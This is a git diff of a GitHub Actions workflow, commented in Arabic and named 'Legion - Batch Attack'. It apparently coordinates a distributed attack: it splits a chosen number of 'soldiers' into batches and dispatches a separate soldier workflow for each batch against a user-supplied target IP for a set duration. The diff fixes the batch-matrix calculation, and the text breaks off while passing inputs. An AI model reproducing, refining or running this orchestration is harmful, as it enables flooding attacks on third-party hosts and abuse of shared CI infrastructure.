@@ -1,5 +1,5 @@
-# اسم الـ Workflow: Legion - Batch Attack Strategy (v4)
-name: Legion - Batch Attack (v4)
+# اسم الـ Workflow: Legion - Batch Attack Strategy (v5 - Corrected)
+name: Legion - Batch Attack (v5)
 
 on:
   workflow_dispatch:
@@ -11,7 +11,7 @@ on:
       duration_per_batch:
         description: 'مدة الهجوم لكل دفعة (بالثواني)'
         required: true
-        default: '300' # 5 دقائق لكل دفعة
+        default: '300'
       total_soldiers:
         description: 'إجمالي عدد الجنود المراد إطلاقه'
         required: true
@@ -22,32 +22,58 @@ on:
         default: '19'
 
 jobs:
-  # المهمة الرئيسية: قائد الفيلق الذي ينسق الدفعات
+  # المهمة الأولى: حساب عدد الدفعات
+  calculate_batches:
+    runs-on: ubuntu-latest
+    outputs:
+      # المخرج الذي سيحتوي على مصفوفة أرقام الدفعات
+      batch_matrix: ${{ steps.generate-matrix.outputs.matrix }}
+    steps:
+      - name: Calculate number of batches
+        id: generate-matrix
+        run: |
+          # إجراء العمليات الحسابية باستخدام bash
+          TOTAL=${{ github.event.inputs.total_soldiers }}
+          SIZE=${{ github.event.inputs.batch_size }}
+          # معادلة لحساب عدد الدفعات مع التقريب للأعلى
+          NUM_BATCHES=$(( (TOTAL + SIZE - 1) / SIZE ))
+          echo "إجمالي الجنود: $TOTAL, حجم الدفعة: $SIZE, عدد الدفعات المحسوب: $NUM_BATCHES"
+          
+          # إنشاء مصفوفة JSON بناءً على العدد المحسوب
+          MATRIX="{\"include\":["
+          for (( i=0; i<$NUM_BATCHES; i++ )); do
+            MATRIX+="{\"batch_number\":$i},"
+          done
+          # إزالة الفاصلة الأخيرة وإغلاق المصفوفة
+          MATRIX=$(echo $MATRIX | sed 's/,$//')
+          MATRIX+="]}"
+          
+          echo "المصفوفة الناتجة: $MATRIX"
+          # حفظ المصفوفة في مخرج المهمة
+          echo "matrix=$MATRIX" >> $GITHUB_OUTPUT
+
+  # المهمة الثانية: قائد الفيلق الذي ينسق الدفعات
   legion_commander:
+    # تعتمد على المهمة الأولى للحصول على المصفوفة الصحيحة
+    needs: calculate_batches
     runs-on: ubuntu-latest
     
     # استراتيجية المصفوفة لإنشاء الدفعات
     strategy:
       fail-fast: false
-      matrix:
-        # هذه المعادلة تقوم بإنشاء أرقام الدفعات
-        # مثال: إذا كان الإجمالي 150 وحجم الدفعة 19، ستنشئ [0, 1, 2, 3, 4, 5, 6, 7]
-        batch_number: ${{ fromJson(format('[{0}]', join(range(0, ceil(github.event.inputs.total_soldiers / github.event.inputs.batch_size)), ','))) }}
+      # استخدام المصفوفة التي تم إنشاؤها في المهمة السابقة
+      matrix: ${{ fromJson(needs.calculate_batches.outputs.batch_matrix) }}
 
     steps:
-      # الخطوة 1: تسجيل الدفعة الحالية
       - name: Announce Batch ${{ matrix.batch_number + 1 }}
         run: |
           echo "===== بدء الدفعة رقم: ${{ matrix.batch_number + 1 }} ====="
-          echo "هذه الدفعة ستقوم بتشغيل ${{ github.event.inputs.batch_size }} جنديًا."
 
-      # الخطوة 2: استدعاء Workflow الجنود (Soldier Workflow)
-      # هذا يستدعي workflow آخر بشكل متزامن وينتظره حتى ينتهي
       - name: Dispatch Soldier Batch
         uses: benc-uk/workflow-dispatch@v1
         with:
           workflow: soldier.yml # اسم ملف workflow الجنود
-          token: ${{ secrets.GITHUB_TOKEN }} # صلاحيات لتشغيل workflow آخر
+          token: ${{ secrets.GITHUB_TOKEN }}
           inputs: >
             {
               "target_ip": "${{ github.event.inputs.target_ip }}",
